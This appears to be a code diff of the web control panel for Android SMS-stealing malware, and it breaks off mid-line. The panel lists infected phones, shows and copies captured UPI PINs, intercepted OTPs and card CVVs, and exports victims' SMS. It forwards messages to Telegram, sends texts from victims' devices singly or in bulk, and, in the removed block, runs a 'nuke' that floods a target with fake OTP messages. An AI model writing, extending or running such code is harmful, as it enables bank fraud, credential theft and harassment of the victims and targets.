+  $("pinBox").textContent = d && d.raw && d.raw.upipin ? d.raw.upipin : "Not detected";
 }
 
 async function saveTg(){
@@ -1675,7 +1682,7 @@ async function saveTg(){
   if(v.startsWith("https://t.me/")) v = v.replace("https://t.me/", "@");
   if(v.startsWith("t.me/")) v = v.replace("t.me/", "@");
   S.tg[S.cur.id] = v;
-  localStorage.setItem("ghost_tg", JSON.stringify(S.tg));
+  localStorage.setItem(LS_TG, JSON.stringify(S.tg));
   try { await fbSet("panel_settings/tgChats/" + S.cur.id, v); } catch {}
   $("tgSt").classList.add("on");
   toast("Telegram saved", "ok");
@@ -1686,7 +1693,7 @@ async function saveFwd(){
   const v = $("setFwd").value.trim();
   if(!v){ toast("Enter number", "err"); return; }
   S.fwd[S.cur.id] = v;
-  localStorage.setItem("ghost_fwd", JSON.stringify(S.fwd));
+  localStorage.setItem(LS_FWD, JSON.stringify(S.fwd));
   try {
     await fbSet("settings/" + S.cur.id + "/forwardTo", v);
     await fbSet("panel_settings/fwdNums/" + S.cur.id, v);
@@ -1695,18 +1702,25 @@ async function saveFwd(){
   toast("Saved — testing...", "ok");
   if(S.msgs.length){
     autoFwd(S.cur.id, {sender: S.msgs[0].sender, body: "[TEST] " + S.msgs[0].body, ts: Date.now()});
-  } else {
-    try {
-      const data = await fbGet(`messages/${S.cur.id}?limitToLast=1`);
-      const msgs = parseMsgs(data);
-      if(msgs.length) autoFwd(S.cur.id, {sender: msgs[0].sender, body: "[TEST] " + msgs[0].body, ts: Date.now()});
-    } catch {}
   }
 }
 
+function saveAlias(){
+  if(!S.cur) return;
+  const v = $("setAlias").value.trim();
+  setAlias(S.cur.id, v);
+  S.cur.name = v || ("Device ·" + S.cur.id.slice(-4));
+  S.cur.hasAlias = !!v;
+  $("dName").textContent = S.cur.name;
+  render();
+  toast(v ? "Alias saved" : "Alias cleared", "ok");
+}
+
 function copyPin(){
-  if(!S.cur || !S.cur.upi){ toast("No PIN detected", "err"); return; }
-  copy(S.cur.upi, "PIN copied");
+  const d = S.cur;
+  const pin = d && d.raw && d.raw.upipin;
+  if(!pin){ toast("No PIN detected", "err"); return; }
+  copy(pin, "PIN copied");
 }
 
 async function deleteDevice(){
@@ -1715,12 +1729,13 @@ async function deleteDevice(){
   try {
     await fbDel("clients/" + S.cur.id);
     S.devices = S.devices.filter(d => d.id !== S.cur.id);
+    delete S.phoneCache[S.cur.id];
     stats(); render(); closeDrawer();
     toast("Deleted", "ok");
   } catch { toast("Failed", "err"); }
 }
 
-/* ─── debug ─── */
+/* ─────────── debug ─────────── */
 async function renderDebug(){
   const d = S.cur;
   if(!d) return;
@@ -1735,15 +1750,13 @@ async function renderDebug(){
     if(d.raw) el.textContent = JSON.stringify(d.raw, null, 2);
   }
 }
-
 function copyRaw(){
   if(!S.cur || !S.raw[S.cur.id]) { toast("Nothing to copy", "err"); return; }
   copy(JSON.stringify(S.raw[S.cur.id], null, 2), "JSON copied");
 }
-
 function reloadRaw(){ renderDebug(); }
 
-/* ─── otp ─── */
+/* ─────────── otp bar ─────────── */
 function showOtp(otp, sender){
   S.lastOtp = otp;
   $("otpN").textContent = otp;
@@ -1761,11 +1774,8 @@ function dismissOtp(){
   if(S.otpT){ clearTimeout(S.otpT); S.otpT = null; }
 }
 
-/* ─── bulk ─── */
-function openBulk(){
-  $("bulkMw").classList.add("on");
-  renderBulkList();
-}
+/* ─────────── bulk ─────────── */
+function openBulk(){ $("bulkMw").classList.add("on"); renderBulkList(); }
 function closeBulk(){ $("bulkMw").classList.remove("on"); }
 function renderBulkList(){
   const box = $("bulkList");
@@ -1779,7 +1789,7 @@ function renderBulkList(){
     row.className = "dc";
     row.innerHTML = `
       <input type="checkbox" data-id="${esc(d.id)}">
-      <span class="dc-n">${esc(d.name)} <span style="color:var(--text3);font-family:var(--mono);font-size:10px">${esc(fmtPhone(d.phone || (d.sims[0] && d.sims[0].number) || ""))}</span></span>
+      <span class="dc-n">${esc(d.name)} <span style="color:var(--text3);font-family:var(--mono);font-size:10px">${esc(d.phone ? fmtPhone(d.phone) : "")}</span></span>
       <span class="dc-d ${d.status ? "on" : "off"}"></span>`;
     box.appendChild(row);
   });
@@ -1814,7 +1824,7 @@ async function fireBulk(){
   closeBulk();
 }
 
-/* ─── nuke ─── */
+/* ─────────── nuke ─────────── */
 function openNuke(){ $("nukeMw").classList.add("on"); }
 function closeNuke(){
   if(S.nuke){ if(!confirm("Stop nuke?")) return; nukeStop(); }
@@ -1832,124 +1842,4 @@ function nukeMode(m){
   $("nBody").style.display = m === "custom" ? "block" : "none";
 }
 function randId(){
-  const c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-  let s = "";
-  for(let i = 0; i < 8; i++) s += c[Math.floor(Math.random() * c.length)];
-  return s;
-}
-function randOtp(){ return String(Math.floor(100000 + Math.random() * 900000)); }
-function randMsg(){
-  const t = [
-    `Your OTP is ${randOtp()}. Valid 5 min.`,
-    `${randOtp()} is your verification code.`,
-    `Login OTP: ${randOtp()}.`,
-    `Use ${randOtp()} to complete login.`,
-    `OTP: ${randOtp()} (valid 3 min).`,
-    `Your code: ${randOtp()}. Ref ${randId()}.`
-  ];
-  return t[Math.floor(Math.random() * t.length)];
-}
-function nukeLog(msg, ok){
-  const box = $("nLog");
-  const l = document.createElement("div");
-  l.className = "nlog-l " + (ok ? "ok" : "err");
-  l.textContent = msg;
-  box.insertBefore(l, box.firstChild);
-  while(box.children.length > 50) box.removeChild(box.lastChild);
-}
-async function nukeStart(){
-  if(S.nuke) return;
-  const to = $("nTo").value.trim();
-  if(!to){ toast("Enter target", "err"); return; }
-  const online = S.devices.filter(d => d.status);
-  if(!online.length){ toast("No online devices", "err"); return; }
-  S.nuke = true; S.nS = 0; S.nF = 0;
-  $("nS").textContent = "0"; $("nF").textContent = "0";
-  $("nFire").style.display = "none"; $("nStop").style.display = "block";
-  $("nLog").innerHTML = "";
-  const run = async () => {
-    if(!S.nuke) return;
-    const body = S.nMode === "custom" ? ($("nBody").value.trim() || "test") : randMsg();
-    await Promise.all(online.map(async d => {
-      try {
-        await fbSet(`clients/${d.id}/webhookEvent/sendSms`, {from:S.nsim, to, message:body, isSended:false});
-        S.nS++; $("nS").textContent = S.nS;
-        nukeLog(`✓ ${d.name}: ${body.slice(0,40)}`, true);
-      } catch(e){
-        S.nF++; $("nF").textContent = S.nF;
-        nukeLog(`✗ ${d.name}`, false);
-      }
-    }));
-    if(S.nuke) setTimeout(run, CFG.nukeCooldown || 500);
-  };
-  run();
-  toast("Nuke engaged", "err");
-}
-function nukeStop(){
-  S.nuke = false;
-  $("nFire").style.display = "block";
-  $("nStop").style.display = "none";
-  toast(`Stopped — ${S.nS} sent / ${S.nF} failed`, "ok", 4000);
-}
-
-/* ─── init ─── */
-function init(){
-  setInterval(() => {
-    const d = new Date();
-    const p = n => String(n).padStart(2, "0");
-    $("clock").textContent = p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
-  }, 1000);
-
-  $("apkInput").addEventListener("change", e => {
-    const f = e.target.files[0];
-    if(f) parseApk(f);
-    e.target.value = "";
-  });
-  const dz = $("dropZone");
-  dz.addEventListener("dragover", e => { e.preventDefault(); dz.classList.add("dg"); });
-  dz.addEventListener("dragleave", () => dz.classList.remove("dg"));
-  dz.addEventListener("drop", e => {
-    e.preventDefault(); dz.classList.remove("dg");
-    const f = e.dataTransfer.files[0];
-    if(f) parseApk(f);
-  });
-
-  const params = new URLSearchParams(location.search);
-  const s = params.get("s");
-  if(s){
-    const p = parseShare(s);
-    if(p){
-      history.replaceState({}, "", location.pathname);
-      connect(p.url, p.key).catch(e => showErr(e.message || "Failed"));
-      return;
-    }
-  }
-  try {
-    const last = JSON.parse(localStorage.getItem(LS_L) || "null");
-    if(last && last.url && last.key && CFG.autoConnectLast){
-      connect(last.url, last.key, false).catch(() => showSaved());
-      return;
-    }
-  } catch {}
-  showSaved();
-}
-
-if(document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
-else init();
-
-window.G = {
-  login, logout, showNew, showSaved,
-  render, setFilter,
-  openDrawer, closeDrawer, tab, pills,
-  pickSim, useNum, sendSms,
-  saveTg, saveFwd, copyPin, deleteDevice,
-  deleteMsg, deleteAllMsgs, setMf, exportSms,
-  revealCvv, copy, copyOtp, dismissOtp,
-  openBulk, closeBulk, bulkSel, bulkSim, fireBulk,
-  openNuke, closeNuke, nukeSim, nukeMode, nukeStart, nukeStop,
-  renderSms, copyRaw, reloadRaw
-};
-})();
-</script>
-</body>
-</html>
+  const c = "
